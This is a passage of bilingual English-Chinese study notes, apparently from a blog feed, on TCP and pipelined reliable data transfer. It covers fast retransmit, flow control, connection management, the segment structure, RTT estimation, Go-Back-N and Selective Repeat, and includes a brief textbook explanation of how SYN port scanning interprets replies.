id="Doubling-the-Timeout-Interval，超时间隔加倍">Doubling the Timeout Interval，超时间隔加倍</h6><ul><li>whenever the timeout event occurs, TCP retransmits the <strong>not-yet-acknowledged segment</strong> with the <strong>smallest sequence</strong> number</li><li>每次TCP重传时都会将下一次的超时间隔设为先前值的<strong>两倍</strong>，而不是用从 EstimatedRTT 和DevRTT推算出的值</li><li>the intervals grow exponentially after each retransmission，超时间隔在每次重传后会呈指数型增长</li></ul><h6 id="Fast-Retransmit，快速重传">Fast Retransmit，快速重传</h6><ul><li><p>One of the problems with <u>timeout-triggered retransmissions</u>(触发超时重传) is that the <u>timeout period</u>(超时周期) can be relatively long. When a segment is <u>lost</u>, this long timeout period forces the sender to <u>delay</u> resending the lost packet, thereby <strong>increasing the end-to-end delay</strong></p><p>==》 the sender can often detect(检测，发现) packet loss well before the timeout event occurs by noting so-called <strong>duplicate ACK</strong>（冗余ACK）</p></li><li><p>TCP ACK generation recommendation(介绍，建议)</p></li><li><table><thead><tr><th>event at receiver</th><th>TCP receiver action</th></tr></thead><tbody><tr><td>arrival of in-order segment with expected seq #. All data up to expected seq # already ACKed</td><td>delayed ACK. Wait up to 500ms for next segment. If no next segment, send ACK</td></tr><tr><td>arrival of in-order segment with expected seq #. One other  segment has ACK pending</td><td>immediately send single cumulative  ACK, ACKing both in-order segments</td></tr><tr><td>arrival of out-of-order segment higher-than-expect seq. # . Gap detected (大于预期、顺序编号的报文，即检测到空白区域)</td><td>immediately send duplicate ACK(冗余ACK),  indicating seq. # of next expected byte (指明下一个期待的报文编号)</td></tr><tr><td>arrival of segment that  partially or completely fills gap</td><td>immediate send ACK, provided that segment starts at lower end of gap</td></tr></tbody></table></li><li><p>time-out period often  relatively long可能相对较长</p><ul><li>long delay before  resending lost packet</li><li>increase end-to-end delay</li></ul></li><li><p>detect lost segments via  duplicate ACKs</p><ul><li>sender often sends many  segments back-to-back (连续)</li><li>if segment is lost, there  will likely be many duplicate ACKs</li></ul></li><li><p>In the case that <strong>three duplicate ACKs</strong> are received, the TCP sender performs a <strong>fast retransmit</strong></p><ul><li>retransmitting the missing segment before that segment’s timer expires</li></ul></li></ul><ul><li>选择确认（selective acknowledgment）：允许TCP接收方有选择地确认失序报文段，而不是累积地确认最后一个正确接收的有序报文段</li></ul><h3 id="3-5-5-Flow-Control，流量控制">3.5.5 Flow Control，流量控制</h3><ul><li>When the TCP connection receives bytes that are correct and in sequence, it places the data in the receive buffer，正确字节=》接收缓存</li><li>The associated application process will read data from this buffer, but not necessarily at the instant the data arrives，应用读取，但非立刻读取</li><li>f the application is relatively slow at reading the data, the sender can very easily overflow the connection’s receive buffer by sending too much data too quickly，使该连接的接收缓存溢出</li><li>TCP provides a <strong>flow-control service</strong>(流量控制服务) to its applications to eliminate the possibility of the sender overflowing the receiver’s buffer</li><li>Flow control is a <u>speed-matching service</u>速度匹配服务—matching the rate at which the sender is sending against the rate at which the receiving application is reading</li><li><strong>congestion control</strong>拥塞控制：TCP发送方也可能因为IP网络的拥塞而被遏制</li></ul><ul><li><p>TCP provides flow control by having the sender maintain a variable called the <strong>receive window</strong>（接收窗口）=》（how much free buffer space is available at the receiver）</p></li><li><p>Because TCP is full-duplex, the sender at each side of the connection maintains a distinct receive window（双方皆有）</p></li><li><p>RevBuffer：denote receive buffer‘s  size</p></li><li><p>例</p><ul><li><p>Host A is sending a large file to  Host B over a TCP connection,  allocates a receive buffer  RcvBuffer(接收缓存）</p></li><li><p>LastByteRead: the number of the  last byte in the data stream read  from the buffer by the  application process in B，主机 B上的应用进程从缓存读出的数据流的最后一个字节的编号 (应用层从缓存中读取的最新一个字节的编号)</p></li><li><p>LastByteRead: the number of the  last byte in the data stream read  from the buffer by the  application process in B，从网络中到达的并且已放入主机 B接收缓存中的数据流的最后一个字节的编号 (应用层从缓存中读取的最新一个字节的编号)</p></li><li><p>TCP is not permitted to overflow the allocated buffer：</p><ul><li>LastByteRcvd – LastByteRead &lt;= RcvBuffer</li></ul></li><li><p>denoted <u>rwnd</u> (receive windows) is set to the amount of spare  room in the buffer (接收缓存中空闲空间)</p><ul><li>rwnd = RcvBuffer – [LastByteRcvd – LastByteRead]</li></ul></li><li><p>How does the connection use the variable <u>rwnd</u> to provide the flow-control service?</p><ul><li>Host B tells Host A how much spare room it has in the connection buffer by (placing its <strong>current value of rwnd</strong> in the <strong>receive window field</strong> of <u>every segment it sends to A</u>), 把当前的rwnd 值放入它发给主机 A 的报文段接收窗口字段中</li><li>Initially, Host B sets <u>rwnd =RcvBuffer</u></li></ul></li><li><p>LastByteSent-LastByteAcked，就是主机A发送到连接中但未被确认的数据量。通过将未确认的数据量控制在值 rwnd 以内，就可以保证主机 A 不会使主机B的接收缓存溢出。因此，主机 A在该连接的整个生命周期须保证∶ LastByteSent -LastByteAcked ≤ rwnd</p></li><li><p>the TCP specification requires:</p></li><li><p>Host A to <u>continue to send segments</u> with <strong>one data byte</strong> when <u>B’s receive window</u> is <strong>zero</strong>. These segments will be acknowledged by the receiver</p></li><li><p>Eventually the buffer will <u>begin to empty</u> and the <u>acknowledgments</u> will contain a <strong>nonzero rwnd value</strong></p></li><li><p>receiver “advertises” free buffer  space by including rwnd value in  TCP header of receiver-to-sender  segments</p><ul><li>RcvBuffer size set via socket  options (typical default is 4096  bytes)</li><li>many operating systems  autoadjust RcvBuffers</li></ul></li><li><p>sender limits amount of unacked (“in-flight”) data according to  receiver’s rwnd value</p></li></ul></li></ul><h3 id="3-5-6-TCP-Connection-Management-TCP连接管理">3.5.6 TCP Connection Management,TCP连接管理</h3><ul><li><p>The TCP in the client then proceeds to establish a TCP connection with the TCP in the server in the following manner:</p></li><li><p>:one:client-side TCP first sends <u>a special TCP segment</u>(<strong>SYN segment</strong>) to the server-side TCP</p><ul><li>ontains no application-layer data</li><li>the <strong>SYN bit</strong> is set to <strong>1</strong></li><li>the client <strong>randomly</strong> chooses an <strong>initial sequence number</strong>(<strong>client_isn</strong>)and puts this number in the <strong>sequence number field</strong> of the <u>initial TCP SYN segment</u></li><li>This segment is <u>encapsulated</u> within an <u>IP datagram</u> and sent to the server</li></ul></li><li><p>:two:server host receives SYN,  replies with SYNACK segment</p><p>​ (the server extracts(提取) the <u>TCP SYN segment</u> from the <u>datagram</u>, allocates(分配) the <strong>TCP buffers</strong> and <strong>variables</strong> to the <u>connection</u>, and <u>sends</u> a <strong>connection-granted segment</strong> to the client TCP，发送允许连接的报文)</p><ul><li>also contains no application-layer data</li><li>the <strong>SYN bit</strong> is set to 1</li><li>the <strong>acknowledgment field</strong> of the TCP segment header is set to <strong>client_isn+1</strong></li><li>the server <u>chooses</u> its own <strong>initial sequence number(server_isn)</strong> and puts this value in the sequence number field of the TCP segment header</li></ul><p>(我收到了你发起建立连接的 SYN 分组，该分组带有初始序号 client_isn。我同意建立该连接。我自己的初始序号是 server_isn,The connection-granted segment is referred to as a <strong>SYNACK segment</strong>)</p></li><li><p>:three:Upon receiving the SYNACK segment, the client also allocates buffers and variables to the connection</p><ul><li>The client host then sends the server yet another segment, this last segment acknowledges the server’s connection-granted segment<ul><li>putting the value <strong>server_isn+1</strong> in the <strong>acknowledgment field</strong> of the TCP segment header</li><li>the <strong>SYN bit</strong> is set to <strong>zero</strong>, since the connection is established</li></ul></li><li>This third stage of the three-way handshake may carry client-to-server data in the segment payload</li></ul></li><li><p>Once these three steps have been completed, the client and server hosts can send segments containing data to each other</p></li><li><p>In each of these <u>future</u> segments, the <u>SYN</u> bit will be set to <u>zero</u></p></li></ul><ul><li><p>Either of the two processes participating in a TCP connection can end the connection. When a connection ends, the&quot;resources&quot;(that is, the buffers and variables) in the hosts are deallocated, 任何一方均可终止，终止后资源释放</p><ul><li>the client TCP to send a special TCP segment to the server process<ul><li>has a flag bit in the segment’s header, the <strong>FIN bit</strong>, set to <strong>1</strong></li></ul></li><li>When the server receives this segment, it sends the client an <strong>acknowledgment segment</strong> in return</li><li>The server then sends its own <strong>shutdown segment</strong>(终止报文), which has the <strong>FIN bit</strong> set to <strong>1</strong></li><li>the client <strong>acknowledges</strong> the server’s shutdown segment( this point, <strong>all</strong> the resources in the two hosts are now <strong>deallocated</strong>)</li><li>Timed Wait: lets TCP client  resend final ack. in case lost,  typical values are 30 seconds, 1 minute, and 2 minutes（S如果在Timeout内未收到C的ACK，则将重新发送FIN。C在Timed wait里面若再次收到来自S的FIN，将重发 ACK并重新进入到Timed wait 状态，确保S能进入到关闭）</li><li>Note: with small modification,  can handle simultaneous  FINs</li></ul></li><li><p>During the life of a TCP connection, the TCP protocol [running in each host] makes transitions through various <strong>TCP states</strong>(TCP 状态)</p></li></ul><ul><li><p>RST segment:</p><ul><li>when receiving a TCP segment whose port number or source  IP address do not match with any of the ongoing socket  (receiver side)<ul><li>Host send a special RST segment to source (如果是TCP)</li><li>Tell it “I don’t have a socket for that segment, psl don’t  resend”</li><li>Host send a special ICMP datagram for UDP case (如果是UDP)</li></ul></li></ul></li><li><p>How to scan the target host port?  If you send a TCP SYN segment with destination port  6789</p><ul><li>(1) receives a TCP SYN ACK from destination: an  application is running with TCP port 6789</li><li>(2) receives a TCP RST from destination: the target host  is not running with TCP port 6789, attacker knows the  segment arrived in the host and are not blocked by  firewall</li><li>(3) receives nothing: SYN segment was likely blocked by  firewall and never reached the target host</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三章-运输层（四）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%824/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%824/</url>
    
    <content type="html"><![CDATA[<h1>3.5 Connection-Oriented Transport: TCP</h1><ul><li><p>TCP protocol runs <u>only</u> in the <strong>end systems</strong> and not in the <u>intermediate network elements</u>(routers and link-layer switches), the intermediate network elements <strong>do not maintain TCP connection state</strong></p><ul><li>the intermediate routers are completely oblivious(不在意，不察觉) to TCP connections; they see <strong>datagrams</strong>, not connections</li></ul></li><li><p>A TCP connection provides a <strong>full-duplex service</strong>，全双工服务:</p><ul><li>bi-directional (双向) data flow in  same connection</li><li>MSS: maximum segment size，最大报文段长度 （<strong>传输层</strong>能承载的<strong>应用层最大数据长度</strong>，<strong>不包括传输层的头部</strong>）</li></ul></li><li><p><strong>point-to-point</strong>，点对点</p><ul><li>one sender, one receiver</li><li>not support one sender to  many receivers (multicasting ，多播)</li></ul></li><li><p>Pipelined (流水线):</p><ul><li>TCP congestion and flow  control set window size</li></ul></li><li><p>connection-oriented:</p><ul><li>handshaking (exchange of control  msgs) inits sender, receiver state  before data exchange</li></ul></li><li><p>flow controlled:</p><ul><li>sender will not overwhelm receiver</li></ul></li></ul><h3 id="3-5-1-TCP连接">3.5.1 TCP连接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">clientSocket.connect((serverName,serverPort))<br></code></pre></td></tr></table></figure><ul><li>the client first sends a special TCP segment</li><li>the server responds with a second special TCP segment</li><li>and finally the client responds again with a third special segment</li><li>The first two segments carry no payload, that is, no application-layer data</li><li>the third of these segments may carry a <u>payload</u>（有效载荷）</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%824/3.27.jpg" class=""><ul><li><p>TCP directs this data to the connection’s <strong>send buffer</strong>, which is one of the buffers that is set aside during the initial three-way handshake，发送缓存是在三次握手初期设置的缓存之一</p></li><li><p>From time to time, TCP will grab chunks of data from the send buffer</p><p>（有趣的是，在 TCP规范中没提及 TCP 应何时实际发送缓存里的数据，只是描述为&quot;TCP 应该在它方便的时候以报文段的形式发送数据&quot;）</p></li><li><p>the maximum amount of data that can be grabbed and placed in a segment is limited by the <strong>maximum segment size</strong> (MSS，最大报文段长度)</p><ul><li>the MSS is typically set by first determining the length of the <strong>largest link-layer frame</strong> that can be sent by the <strong>local sending host</strong> (the so-called <strong>maximum transmission unit</strong>, MTU,最大传输单元)，MSS通常根据最初确定的由 地发送主机发送的最大链路层帧长度来设置</li><li>setting the MSS to ensure that a TCP segment (when encapsulated in an IP datagram) will fit into a single <strong>link-layer fram</strong>，设置该MSS要保证一个TCP报文段（当封装在一个IP数据报中） 加上 TCP/P首部长度（通常40字节）将适合单个链路层帧</li></ul></li><li><p>TCP pairs each chunk of client data with a TCP header, thereby forming TCP segments</p></li><li><p>TCP connection=buffers + variables + a socket connection to a process （in one host）+ another set of buffers + variables + a socket connection to a process （in another host）</p><ul><li>在这两台主机之间的网络元素（路由器、交换机和中继器）中，没有为该连接分配任何缓存和变量</li></ul></li></ul><h3 id="3-5-2-TCP-Segment-Structure">3.5.2 TCP Segment Structure</h3><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%824/3.28.jpg" class=""><ul><li>TCP报文段首部还包含的字段∶<ul><li>The <u>32-bit</u> <strong>sequence number field</strong>(序号字段) and the <u>32-bit</u> <strong>acknowledgment number field</strong>(确认号字段)<ul><li>used by the TCP sender and receiver in implementing a <strong>reliable data transfer service</strong></li></ul></li><li>the <u>16-bit</u> <strong>receive window field</strong>(接收窗口字段)<ul><li>used for <strong>flow control</strong></li><li>indicate the number of bytes that a receiver is <strong>willing to accept</strong></li></ul></li><li>The <u>4-bit</u> <strong>header length field</strong><ul><li>该字段指示了以32比特的字为单位的TCP首部长度。由于TCP选项字段的原因，TCP首部的长度是可变的（通常选项字段为空，所以TCP首部的典型长度就是20字节）</li></ul></li><li>The <u>optional</u> and <u>variable-length</u> <strong>options field</strong>(选项字段)<ul><li>used when a sender and receiver negotiate(协商) the maximum segment size (MSS)or as a <u>window scaling factor</u>(窗口调节因子) for use in <u>high&gt;-speed networks</u>(高速网络)</li></ul></li><li>the <strong>flag field</strong>(标志字段) contains 6 bits<ul><li>ACK bit<ul><li>used to indicate that the value carried in the acknowledgment field is valid; that is, the segment contains an acknowledgement for a segment that has been successfully received</li></ul></li><li>RST, SYN, FIN bits<ul><li>used for <strong>connection setup and teardown</strong>，连接建立和拆除</li></ul></li><li>PSH bit<ul><li>indicates that the receiver should pass the data to the <strong>upper layer</strong> immediately，当PSH比特被设置的时候，就指示接收方应立即将数据交给上层</li></ul></li><li>URG bit<ul><li>used to indicate that there is data in this segment that the sending-side upper-layer entity has marked as&quot;urgent&quot;，指示报文段里存在着被发送端的上层实体置为&quot;紧急&quot;的数据</li></ul></li></ul></li><li>the <u>16-bit</u> <strong>urgent data pointer field</strong>(紧急数据指针字段)<ul><li>TCP must inform the receiving-side upper-layer entity when urgent data exists and pass it a pointer to the end of the urgent data</li></ul></li></ul></li></ul><p>（在实践中，PSH、URG 和紧急数据指针并没有使用）</p><h6 id="Sequence-Numbers-and-Acknowledgment-Numbers，序号和确认号">Sequence Numbers and Acknowledgment Numbers，序号和确认号</h6><ul><li><p>TCP报文段首部中两个最重要的字段是序号字段和确认号字段这两个字段是TCP可靠传输服务的关键部分</p></li><li><p>TCP views data as an <u>unstructured</u>, but <u>ordered</u>, stream of <u>bytes</u>，无结构的、有序的字节流</p></li><li><p>sequence numbers are over the stream of transmitted bytes and not over the series of transmitted segments，序号是建立在传送的字节流之上，而不是建立在传送的报文段的序列之上</p></li><li><p>The <strong>sequence number for a segment</strong>(报文段的序号) is therefore <strong>the byte-stream number</strong> of the <strong>first byte in the segment</strong>，是该报文段首字节的字节流编号</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%824/3.29.jpg" class=""></li><li><p>ACK # is the sequence number of  the next byte that receiver is  expecting from sender. (different  from rdt 3.0!) 接收方期待收到的字节数据的序列号</p><ul><li>example 1: Host R has received  bytes from 0-535 from host S, is  about to send segment to host S  with 536 in ACK# field</li><li><strong>cumulative ACK</strong> (TCP采用累积确认)：example 2: R has received 0-535,  900-1000, R’s next segment  contain 536 in ACK# field</li></ul></li><li><p>How receiver handles out-of-order segments?</p><ul><li><p>the receiver immediately <u>discards</u> out-of-order segments</p></li><li><p>the receiver <u>keeps</u> the out-of-order bytes and waits for the missing bytes to <u>fill in the gaps</u>填补间隔</p><p>（Clearly, the latter choice is more efficient in terms of network bandwidth,and is the approach taken in practice）</p></li></ul></li><li><p>我们假设初始序号为0，事实上，一条TCP连接的双方均可随机地选择初始序号</p><ul><li>This is done to minimize the possibility that a segment that is still present in the network from an earlier, already-terminated connection between two hosts is <u>mistaken</u> for a valid segment in a later connection between these same two hosts (which also happen to be using the same port numbers as the old connection)，减少误会</li></ul></li><li><p>例：suppose the starting sequence numbers are 42 and 79 for the client and server，Now suppose the user types a single letter, ‘C’</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%824/3.30.jpg" class=""><ul><li><p>在TCP连接建立后但没有发送任何数据之前，该客户等待字节79，而该服务器等待字节42</p></li><li><p>1、第一个报文段是由客户发往服务器，在它的数据字段里包含一字节的字符’C’的ASCII码，由于客户还没有接收到来自服务器的任何数据，因此该第一个报文段中的确认号字段中是79</p><p>2、二个报文段目的：</p><p>①为该服务器所收到数据提供一个确认</p><p>​通过在确认号字段中填入43，服务器告诉客户它已经成功地收到字节42及以前的所有字节，现在正等待着字节43的出现</p><p>②回显字符 ‘C’</p><p>​在第二个报文段的数据字段里填入的是字符’C’的ASCⅡ码</p><p>​第二个报文段的序号为79，它是该TCP连接上从服务器到客户的数据流的起始序号，这也正是服务器要发送的第一个字节的数据</p><p>​对客户到服务器的数据的确认被装载在一 个承载服务器到客户的数据的报文段中;这种确认被称为是被**捎带（piggybacked）**在服务器到客户的数据报文段中的</p><p>3、第三个报文段是从客户发往服务器的：确认已从服务器收到的数据</p><p>​该报文段的数据字段为空</p><p>​该报文段的确认号字段填入的是80，因为客户已经收到了字节流中序号为79及以前的字节，它现在等待着字节 80的出现</p><p>​即使该报文段里没有数据还仍有序号，这是因为TCP存在序号字段，报文段需要填入某个序号</p></li></ul></li></ul><h3 id="3-5-3-Round-Trip-Time-Estimation-and-Timeout，往返时间的估计与超时">3.5.3 Round-Trip Time Estimation and Timeout，往返时间的估计与超时</h3><ul><li>TCP, like our rdt protocol, uses a timeout/retransmit mechanism to recover from lost segments</li><li>Clearly,the timeout should be larger than <strong>the connection’s round-trip time (RTT)</strong>,that is, the time from when a segment is sent until it is acknowledged，，即从一个报文段发出到它被确认的时间. Otherwise, unnecessary retransmissions would be send，不必要的重传</li><li>too short: premature timeout (过早超时), unnecessary  retransmissions</li><li>too long: slow reaction to segment loss，反应迟钝</li></ul><h6 id="Estimating-the-Round-Trip-Time">Estimating the Round-Trip Time</h6><ul><li><p><strong>SampleRTT</strong>(样本RTT): measured time from segment transmission  until ACK receipt</p><ul><li>Instead of measuring a SampleRTT for every transmitted segment, most TCP implementations take only one SampleRTT measurement at a time. That is, at any point in time, the SampleRTT is being estimated for only one of the <u>transmitted but currently unacknowledged segments</u>, leading to a new value of SampleRTT approximately once every RTT，产生一个接近每个RTT的新SampleRTT值</li><li>TCP never computes(估算) a SampleRTT for a segment that <u>has been retransmitted</u>; it only measures SampleRTT for segments that have been transmitted once，它仅为传输一次的报文段测量SampleRTT</li></ul></li><li><p><strong>EstimatedRTT</strong>(RTT均值)：TCP maintains an average, called EstimatedRTT, of the SampleRTT values</p></li><li><p>TCP就会根据下列公式来更新EstimatedRT: EstimatedRTT=(1-α)· EstimatedRT+α· SampleRTT</p><p>（的α参考值是 α=0.125）</p><p>EstimatedRTT是一个 SampleRTT 值的加权平均值，这个加权平均对最近的样本赋予的权值要大于对老样本赋予的权值，这种平均被称为<strong>指数加权移动平均（Exponential Weighted Moving Average，EWMA）</strong></p><p>influence of past sample decreases exponentially fast过去样本的影响呈指数级下降</p></li><li><p>RTT偏差 DevRTT，用于估算 SampleRT一般会偏离EstimatedRT的程度∶ DevRTT=(1-β)·DevRTT+β·|SampleRTT-EstimatedRTT|</p><p>（β的推荐值为0.25）</p></li></ul><h6 id="Setting-and-Managing-the-Retransmission-Timeout-Interval">Setting and Managing the Retransmission Timeout Interval</h6><ul><li><p>timeout should be &gt;= EstimatedRTT</p></li><li><p>not be too mach larger than EstimatedRTT, not quickly  retransmit, 否则当报文段丢失时，TCP不能很快地重传该报文段，导致数据传输时延大</p></li><li><p>TimeoutInterval = EstimatedRT+4 · DevRT</p><p>(推荐的初始 Timeoutlnterval值为1秒。当出现超时后，Timeoutlnterval值将加倍，以免即将被确认的后继报文段过早出现超时。一旦报文段收到并更新 EstimatedRTT后，TimeoutInterval就又使用上述公式计算了)</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三章-运输层（三）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%823/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%823/</url>
    
    <content type="html"><![CDATA[<h3 id="3-4-2-Pipelined-Reliable-Data-Transfer-Protocols，流水线可靠数据传输协议">3.4.2 Pipelined Reliable Data Transfer Protocols，流水线可靠数据传输协议</h3><ul><li>Protocol rdt3.0 is a functionally correct protocol. At the heart of rdt3.0’s performance problem is the fact that it is a stop-and-wait protocol</li><li>定义发送方（或信道）的**利用率（utilization）**为：发送方实际忙于将 发送比特送进信道的那部分时间与发送时间之比：$$U~sender~=\frac{L/R}{RTT+L/R}$$</li><li>**流水线(pipelining)**技术对可靠数据传输协议可带来如下影响∶<ul><li>the range of <strong>sequence numbers</strong> must be increased,增加序号范围<ul><li>since each in-transit packet (not counting retransmissions)must have a unique sequence number and there may be multiple, in-transit, unacknowledged packets</li></ul></li><li>the sender and receiver sides of the protocols may have to <strong>buffer</strong> more than one packet,缓存多个分组<ul><li>Minimally, the <u>sender</u> will have to buffer packets that <strong>have been transmitted but not yet acknowledged</strong>,发送但未被确认</li><li>Buffering of <strong>correctly received packets</strong> may also be needed at the <u>receiver</u>，已正确接收</li></ul></li><li>The <u>range of sequence numbers</u> needed and the <u>buffering requirements</u> will depend on the manner in which a <u>data transfer protocol</u> responds to lost, corrupted, and overly delayed packets<ul><li>Two basic approaches toward pipelined error recovery(流水线的差错恢复) can be identified<ul><li><strong>Go-Back-N</strong>，GBN，回退N步</li><li><strong>selective repeat</strong>，SR，选择重传</li></ul></li></ul></li></ul></li></ul><h3 id="3-4-3-Go-Back-N-GBN">3.4.3 Go-Back-N(GBN)</h3><ul><li><p>In a Go-Back-N(GBN)protocol, the <u>sender</u> is allowed to transmit multiple packets (when available) <strong>without waiting for an acknowledgment</strong></p></li><li><p>it is constrained(受限于) to have no more than some <u>maximum</u> allowable number,N, of <strong>unacknowledged packets</strong> in the pipeline，未确认的分组数不能超过某个最大允许数N</p><ul><li>send_base: sequence number of the oldest unacknowledged packet，最早的未确认分组的序号</li><li>nextseqnum: smallest unused sequence number，为最小的未使用序号（即下一个待发分组的序号）</li><li>[ 0 , send_base-1 ] : packets that already been transmitted and acknowledged，已经发送并被确认的分组</li><li>[ send_base , nextseqnum-1 ] : packets that been sent but not yet acknowledged，应已经发送但未被确认</li><li>[ nextseqnum , send_base+N-1 ] : can be used for packets that can be sent  immediately，些要被立即发送的分组</li><li>[ send_base+N,  ] : cannot be used until the packet with sequence number  send_base has been acknowledged</li><li>window size N: maximum allowable number of consecutive(连续的) unacknowledged packets in the pipeline</li></ul></li><li><p>N is often referred to as the window size and the <u>GBN</u> protocol itself as a <strong>sliding-window protocol</strong>(滑动窗口协议)</p></li><li><p>为什么不允许数据报的数量是无限的？=》flow control and congestion control</p></li><li><p>In practice, a packet’s <strong>sequence number</strong> is carried in a <strong>fixed-length field</strong> in the packet <strong>header</strong></p><ul><li>if <strong>k</strong> is the number of bits in the packet <u>sequence number field</u>, <u>the range of sequence numbers</u> is thus <strong>[0,2^k^-1]</strong></li><li><strong>TCP</strong> has a <strong>32-bit sequence number field</strong>, where TCP sequence numbers count bytes in the byte stream rather than packets(注意：TCP序号是按字节流中的字节进行计数的，而不是按分组计数)</li></ul></li><li><p>扩展 FSM：增加了变量（类似 于编程语言中的变量）base和 nextseqnum，还增加了对这些变量的操作以及与这些变量有关的条件动作</p></li><li><p>CBN 发送方必须响应三种类型的事件∶</p><ul><li><p>Invocation from above，上层的调用</p><ul><li>When rdt_send()is called from above, the sender <u>first</u> checks to see <strong>if the window is full</strong><ul><li>not full-&gt; a packet is created and sent、variables are appropriately updated,更新变量</li><li>full-&gt;the  sender simply returns the data back to the upper layer（ an implicit indication that the window is full，隐式地指示窗口已满）<ul><li>In a real implementation, the sender would more likely have either <strong>buffered</strong> (but not immediately sent) this data</li><li>or would have a synchronization mechanism(同步机制) (for example, a semaphore or a flag) that would allow the upper layer to call rdt_send () only when the window is not full</li></ul></li></ul></li></ul></li><li><p>Receipt of an ACK</p></li><li><p>In our GBN protocol, an acknowledgment for a packet with sequence number n will be taken to be a <strong>cumulative acknowledgment</strong>(累积确认). indicating that all packets with a sequence number up to and including n have been correctly received at the receiver</p></li><li><p>A timeout event</p><ul><li><p>single timer, for oldest in-flight(unacked) pkt</p></li><li><p>if a timeout occurs, the <strong>sender</strong> resends all packets that have been previously sent but that have not yet been acknowledged，重传所有已发送但还未被确认过的分组</p></li><li><p>if an ACK is received but there are still additional transmitted but not yet acknowledged packets, the timer is restarted，仍有已发送但未被确认的分组，则定时器被重新启动</p></li><li><p>If there are no outstanding, unacknowledged packets, the timer is stopped，没有已发送但未被确认的分组，该定时器被终止</p></li></ul></li></ul></li><li><p>ACK-only: always send ACK for correctly-received pkt with highest  in-order seq #</p><ul><li>may generate duplicate ACKs</li><li>need only remember expectedseqnum</li></ul></li><li><p>out-of-order pkt:</p><ul><li>discard (don’t buffer): no receiver buffering!(注意)</li><li>re-ACK pkt with highest in-order seq #</li></ul></li></ul><h3 id="3-4-4-Selective-Repeat-SR-，选择重传">3.4.4 Selective Repeat (SR)，选择重传</h3><ul><li>The <u>GBN</u> protocol allows the sender to potentially “fill the pipeline” with packets, thus avoiding the <u>channel utilization problems</u>(信道利用率问题) we noted with stop-and-wait protocols</li><li>GBN 本身也有一些情况存在着性能问题<ul><li><u>retransmit a large number  of packets</u> if <u>window size and bandwidth-delay large</u><ul><li>A single packet error can thus cause GBN to retransmit a large number of packets, many unnecessarily，单个分组的差错就能够引起GBN重传大量分组，许多分组根本没有必要重传</li><li>As the probability of channel errors increases, the pipeline can become filled with these unnecessary retransmissions，随着信道差错率的增加，流水线可能会被这些不必要重传的分组所充斥</li></ul></li></ul></li><li>selective-repeat protocols <u>avoid unnecessary retransmissions</u> by having the sender retransmit only those packets that <u>it suspects were received in error</u>(that is, were lost or corrupted) at the receiver</li></ul><table><thead><tr><th>R发送方的事件与动作</th></tr></thead><tbody><tr><td><strong>Data received from above</strong><br />When data is received from above, the SR sender checks the next available sequence number for the packet<br />If the sequence number is within the sender’s window, the data is packetized and sent<br />otherwise it is either buffered or returned to the upper layer for later transmission, as in GBN</td></tr><tr><td><strong>Timeout</strong><br />Timers are again used to protect against lost packets.<br />However,<u>each</u> packet must now have its own logical timer, since <u>only</u> a single packet will be transmitted on timeout<br /></td></tr><tr><td><strong>ACK received</strong><br />if an ACK is received, the SR sender <u>marks</u> that packet as having been received, <u>provided it is in the window</u><br />If the packet’s sequence number is equal to send_base, the window base is moved forward to the unacknowledged packet with the <u>smallest sequence number</u>，窗口基序号向前移动到具有最小序号的未确认分组处<br />If the window moves and there are untransmitted packets with sequence numbers that now fall within the window, these packets are transmitted，有序号落在窗口内的未发送分组，则发送这些分组</td></tr></tbody></table><table><thead><tr><th>R 接收方的事件与动作</th></tr></thead><tbody><tr><td><strong>Packet with sequence number in [rcv base,rcv_base+N-1]is correctly received</strong><br /> In this case, the received packet falls within the receiver’s window and a selective ACK packet is returned to the sender<br />If the packet was <u>not previously received</u>, it is <u>buffered</u><br />If this packet has a sequence number equal to the base of the receive window(ev_base), then this packet, and any previously buffered and consecutively numbered (beginning with rcv_base)packets are delivered to the upper layer. The receive window is then moved forward by the number of packets delivered to the upper layer,接收窗口按向前移动分组的编号向上交付这些分组</td></tr><tr><td>序号在[rcv_base-N，rev_base-1]内的分组被正确收到。在此情况下，必须产生一个ACK，即使该分组 是接收方以前已确认过的分组</td></tr><tr><td>其他情况，忽略该分组</td></tr></tbody></table><p>==sender==</p><p>data from above:</p><ul><li>if next available seq # in  window, send pkt</li></ul><p>timeout(n):</p><ul><li>resend pkt n, restart timer</li></ul><p>ACK(n) in  [sendbase,sendbase+N-1]:</p><ul><li>mark pkt n as received</li><li>if n is smallest unACKed pkt (n=send_base), move forward  window base to next  unACKed seq #</li></ul><p>==receiver==</p><p>pkt n in [rcvbase, rcvbase+N-1]</p><ul><li>send ACK(n)</li><li>out-of-order: buffer</li><li>in-order (n=recv_base):<ul><li>deliver (also deliver  buffered, in-order pkts),  move forward window to  next not-yet-received pkt</li></ul></li><li>pkt n in [rcvbase-N,rcvbase-1]<ul><li>send ACK(n), although  previously acknowledged</li></ul></li><li>otherwise: ignore</li></ul><ul><li><p>接收方重新确认（而不是忽略）已收到过的那些序号小于当前窗口基序号的分组，意味着发送方和接收方的窗口并不总是一致</p></li><li><p>Selective repeat: dilemma (困境)</p></li><li><p>没有办法区分是一个分组的重传还是一个分组的初次传输，窗口大小的影响（对于 SR 